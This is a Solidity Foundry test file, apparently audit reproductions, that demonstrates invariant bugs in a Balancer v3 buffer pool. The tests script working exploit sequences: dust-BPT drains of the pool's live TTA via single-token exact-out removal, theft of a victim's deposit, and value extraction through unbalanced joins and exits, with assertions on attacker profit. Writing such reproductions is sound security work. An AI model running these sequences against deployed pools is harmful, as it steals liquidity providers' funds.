// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeBufferPool} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/standardExchange/IStandardExchangeBufferPool.sol";
import {TestBase_StandardExchangeBufferPool} from
    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";

/// @notice Minimized reproductions of the P4 invariant breaks on the constProd SE buffer pool.
///         Root: StandardExchangeBufferPoolTarget.computeInvariant prices the TTA side from the STORED
///         virtualTTA and ignores balancesLiveScaled18[ttaIdx]. Balancer's BasePoolMath unbalanced-add and
///         single-token-exact-out-remove derive BPT from computeInvariant(live +/- amount), so any change to
///         the LIVE TTA balance is invisible to BPT pricing:
///         (B1) UNBALANCED add of TTA mints ~0 BPT for the TTA part (depositor's TTA gifted to LPs);
///         (B2) SINGLE_TOKEN_EXACT_OUT removal of TTA burns ~0 BPT (anyone drains the pool's live TTA).
contract P4BufferTtaDomainTest is TestBase_StandardExchangeBufferPool {
    IStandardExchangeBufferPool internal p;
    address internal attacker;
    address internal victim;

    function setUp() public override {
        super.setUp();
        p = IStandardExchangeBufferPool(bufferPool);
        attacker = bob;
        victim = makeAddr("victimLP");
        vm.startPrank(victim);
        IERC20(address(dai)).approve(address(permit2), type(uint256).max);
        IERC20(address(usdc)).approve(address(permit2), type(uint256).max);
        IERC20(address(seVault)).approve(address(permit2), type(uint256).max);
        permit2.approve(address(dai), address(router), type(uint160).max, type(uint48).max);
        permit2.approve(address(seVault), address(router), type(uint160).max, type(uint48).max);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
        vm.stopPrank();
        vm.prank(attacker);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
    }

    function _raw() internal view returns (uint256 tta_, uint256 sh_) {
        (,, uint256[] memory raw,) = bv3Vault.getPoolTokenInfo(bufferPool);
        tta_ = raw[p.ttaIndex()];
        sh_ = raw[p.sharesIndex()];
    }

    function _rate() internal view returns (uint256) {
        return seRateProvider.getRate();
    }

    /// value of `who`'s whole BPT if redeemed proportionally now (TTA + shares at the pool's rate)
    function _propValue(address who) internal returns (uint256 v) {
        uint256 bal = IERC20(bufferPool).balanceOf(who);
        if (bal == 0) return 0;
        uint256 snap = vm.snapshotState();
        uint256 t0 = dai.balanceOf(who);
        uint256 s0 = shares.balanceOf(who);
        removeLiquidityProportional(who, bal, 0, 0);
        v = (dai.balanceOf(who) - t0) + (shares.balanceOf(who) - s0) * _rate() / 1e18;
        vm.revertToState(snap);
    }

    function _log(string memory tag) internal view {
        (uint256 t, uint256 s) = _raw();
        console2.log(tag);
        console2.log("  pool live TTA ", t);
        console2.log("  pool raw shares", s);
        console2.log("  virtualTTA     ", p.virtualTTA());
        console2.log("  BPT supply     ", bv3Vault.totalSupply(bufferPool));
    }

    /// (B1) honest UNBALANCED join of TTA + shares: the TTA part mints ~0 BPT (gifted to existing LPs).
    ///      (A TTA-only UNBALANCED join reverts with panic 0x11: invariant ratio < 1 after the -1 wei haircut.)
    function test_B1_unbalancedJoinWithTta_ttaPartMintsNothing() public {
        uint256 X = 200e18;
        uint256 S = mintShares(victim, 50e18);
        mintTTA(victim, X);
        // reference: same shares, no TTA
        uint256 snap = vm.snapshotState();
        uint256 bptSharesOnly = addLiquidityUnbalanced(victim, 0, S);
        vm.revertToState(snap);
        uint256 aliceBefore = _propValue(alice);
        _log("before victim join");
        uint256 bpt = addLiquidityUnbalanced(victim, X, S);
        _log("after victim join");
        uint256 victimValue = _propValue(victim);
        uint256 aliceAfter = _propValue(alice);
        uint256 valueIn = X + S * _rate() / 1e18;
        console2.log("victim TTA in / shares in", X, S);
        console2.log("victim value in (TTA units)", valueIn);
        console2.log("BPT minted with TTA / shares-only reference", bpt, bptSharesOnly);
        console2.log("victim proportional exit value", victimValue);
        console2.log("victim LOSS (TTA units)", int256(valueIn) - int256(victimValue));
        console2.log("alice value before / after", aliceBefore, aliceAfter);
        assertApproxEqRel(bpt, bptSharesOnly, 0.001e18, "TTA part of the join mints ~0 BPT");
        assertLt(victimValue + X * 90 / 100, valueIn, "victim loses >90% of the TTA deposited");
        assertGt(aliceAfter, aliceBefore + X * 80 / 100, "existing LP captures the gift");
    }

    function test_B1_ttaOnlyUnbalancedJoin_reverts() public {
        mintTTA(victim, 200e18);
        uint256[] memory amts = new uint256[](2);
        amts[p.ttaIndex()] = 200e18;
        vm.prank(victim);
        vm.expectRevert();
        router.addLiquidityUnbalanced(bufferPool, amts, 0, false, bytes(""));
    }

    /// max TTA removable single-sided: Vault debits amountOut + swap fee from the live TTA balance
    function _maxTtaOut(uint256 liveTta) internal view returns (uint256) {
        uint256 fee = bv3Vault.getStaticSwapFeePercentage(bufferPool);
        console2.log("static swap fee", fee);
        return liveTta * (1e18 - 2 * fee) / 1e18 * 99 / 100;
    }

    /// (B2) anyone with dust BPT drains the pool's LIVE TTA via SINGLE_TOKEN_EXACT_OUT for ~0 BPT.
    ///      At deployment the live TTA is the initial LP's seed (2000 DAI here).
    function test_B2_ttaExactOutRemoval_drainsLiveTta() public {
        // attacker capital: ~0.01 share -> dust BPT (counted as cost)
        uint256 shIn = mintShares(attacker, 1e16);
        uint256 costValue = shIn * _rate() / 1e18;
        uint256 bpt = addLiquidityUnbalanced(attacker, 0, shIn);
        (uint256 liveTta,) = _raw();
        _log("before drain");
        uint256 aliceBefore = _propValue(alice);
        uint256 t0 = dai.balanceOf(attacker);
        uint256 out = _maxTtaOut(liveTta); // leave room for the exact-out swap fee charged on the TTA balance
        vm.prank(attacker);
        uint256 bptIn = router.removeLiquiditySingleTokenExactOut(bufferPool, bpt, dai, out, false, bytes(""));
        _log("after drain");
        uint256 gained = dai.balanceOf(attacker) - t0;
        uint256 rem = IERC20(bufferPool).balanceOf(attacker);
        uint256 remValue = _propValue(attacker);
        uint256 aliceAfter = _propValue(alice);
        console2.log("attacker dust BPT / BPT burned", bpt, bptIn);
        console2.log("attacker TTA drained", gained);
        console2.log("attacker cost (share value in)", costValue);
        console2.log("attacker leftover BPT / value", rem, remValue);
        console2.log("attacker NET PROFIT (TTA units)", int256(gained + remValue) - int256(costValue));
        console2.log("alice value before / after", aliceBefore, aliceAfter);
        console2.log("alice LOSS", int256(aliceBefore) - int256(aliceAfter));
        assertEq(gained, out, "drained live TTA");
        assertGt(gained + remValue, costValue + 1000e18, "profit > 1000 DAI");
        assertLt(aliceAfter + 1000e18, aliceBefore, "victim LP loses > 1000 DAI");
    }

    /// (B1+B2) chained: victim's TTA-only join is immediately stolen by the attacker.
    function test_B1B2_victimJoinStolen() public {
        uint256 shIn = mintShares(attacker, 1e16);
        uint256 bpt = addLiquidityUnbalanced(attacker, 0, shIn);
        // drain the seed first so we can attribute the second drain to the victim's deposit
        (uint256 liveTta,) = _raw();
        uint256 first = _maxTtaOut(liveTta);
        vm.prank(attacker);
        router.removeLiquiditySingleTokenExactOut(bufferPool, bpt, dai, first, false, bytes(""));
        uint256 X = 500e18;
        mintTTA(victim, X);
        uint256 S = mintShares(victim, 10e18);
        addLiquidityUnbalanced(victim, X, S);
        uint256 t0 = dai.balanceOf(attacker);
        bpt = IERC20(bufferPool).balanceOf(attacker);
        uint256 take = _maxTtaOut(X);
        vm.prank(attacker);
        uint256 bptIn = router.removeLiquiditySingleTokenExactOut(bufferPool, bpt, dai, take, false, bytes(""));
        console2.log("victim deposit stolen (TTA)", dai.balanceOf(attacker) - t0, "for BPT", bptIn);
        console2.log("victim residual value", _propValue(victim));
        assertEq(dai.balanceOf(attacker) - t0, take);
    }

    /* ------------------------------------------------------------------------------------ */
    /* (B3) shares-side: BPT priced on derivedY = raw - h and virtualTTA, but BPT's            */
    /*      proportional claim is on raw shares + live TTA.                                    */
    /* ------------------------------------------------------------------------------------ */

    /// (B3-exit) proportional join, then SINGLE_TOKEN_EXACT_OUT exit to shares: burns BPT priced on the
    ///           virtual book, receives shares out of the real book.
    function test_B3_proportionalJoin_exactOutSharesExit() public {
        uint256 sh = mintShares(attacker, 600e18);
        mintTTA(attacker, 1000e18);
        uint256 t0 = dai.balanceOf(attacker);
        uint256 s0 = shares.balanceOf(attacker);
        uint256 r0 = _rate();
        uint256 aliceBefore = _propValue(alice);
        // proportional join worth ~10% of the pool
        uint256 supply = bv3Vault.totalSupply(bufferPool);
        addLiquidityProportional(attacker, supply / 10, 1000e18, sh);
        uint256 bpt = IERC20(bufferPool).balanceOf(attacker);
        _log("after proportional join");
        // exit as much as possible single-sided to shares (exact-out), then the rest proportionally
        (, uint256 rawSh) = _raw();
        uint256 lo = 0;
        uint256 hi = rawSh / 4;
        // binary search the largest shares amount the BPT can pay for
        for (uint256 i; i < 40; ++i) {
            uint256 mid = (lo + hi + 1) / 2;
            uint256 snap = vm.snapshotState();
            vm.prank(attacker);
            try router.removeLiquiditySingleTokenExactOut(bufferPool, bpt, shares, mid, false, bytes("")) {
                lo = mid;
            } catch {
                hi = mid - 1;
            }
            vm.revertToState(snap);
        }
        vm.prank(attacker);
        uint256 bptIn = router.removeLiquiditySingleTokenExactOut(bufferPool, bpt, shares, lo, false, bytes(""));
        uint256 rem = IERC20(bufferPool).balanceOf(attacker);
        if (rem > 0) removeLiquidityProportional(attacker, rem, 0, 0);
        _log("after single exact-out exit");
        int256 dT = int256(dai.balanceOf(attacker)) - int256(t0);
        int256 dS = int256(shares.balanceOf(attacker)) - int256(s0);
        int256 pnl = dT + dS * int256(r0) / 1e18;
        uint256 aliceAfter = _propValue(alice);
        console2.log("BPT joined / burned single-sided", bpt, bptIn);
        console2.log("shares out single-sided", lo);
        console2.log("attacker dTTA / dShares");
        console2.logInt(dT);
        console2.logInt(dS);
        console2.log("attacker PnL at pre-attack rate (TTA units)");
        console2.logInt(pnl);
        console2.log("alice value before / after", aliceBefore, aliceAfter);
        assertEq(IERC20(bufferPool).balanceOf(attacker), 0);
    }

    /// (B3-join) honest shares-only UNBALANCED join: value received vs value deposited.
    function test_B3_sharesOnlyUnbalancedJoin_valueRatio() public {
        uint256 S = mintShares(victim, 100e18);
        uint256 valueIn = S * _rate() / 1e18;
        uint256 aliceBefore = _propValue(alice);
        uint256 bpt = addLiquidityUnbalanced(victim, 0, S);
        uint256 victimValue = _propValue(victim);
        console2.log("shares in / value in", S, valueIn);
        console2.log("BPT minted", bpt);
        console2.log("victim proportional exit value", victimValue);
        console2.log("victim value ratio (bps)", victimValue * 10000 / valueIn);
        console2.log("alice value before / after", aliceBefore, _propValue(alice));
    }

    /// (X1) cross-venue check of the full-book rate understatement: buy shares from the buffer pool with DAI,
    ///      redeem them through the SE vault for DAI in the same tx. Classifies the medium-run I7 hit.
    function test_X1_crossVenue_buyInPool_redeemInSeVault() public {
        uint256[3] memory sizes = [uint256(50e18), 200e18, 600e18];
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            uint256 X = sizes[i];
            mintTTA(attacker, X);
            uint256 rateBefore = _rate();
            uint256 d0 = dai.balanceOf(attacker);
            uint256 got = swapTTAforShares(attacker, X);
            vm.startPrank(attacker);
            IERC20(address(seVault)).approve(address(seVault), got);uint256 back = seVault.exchangeIn(IERC20(address(seVault)), got, IERC20(address(dai)), 0, attacker, false, block.timestamp);
            vm.stopPrank();
            console2.log("X / shares bought / DAI redeemed", X, got, back);
            console2.log("rate before / pool avg price (1e18)", rateBefore, X * 1e18 / got);
            console2.log("net DAI");
            console2.logInt(int256(dai.balanceOf(attacker)) - int256(d0));
            vm.revertToState(snap);
        }
    }
}
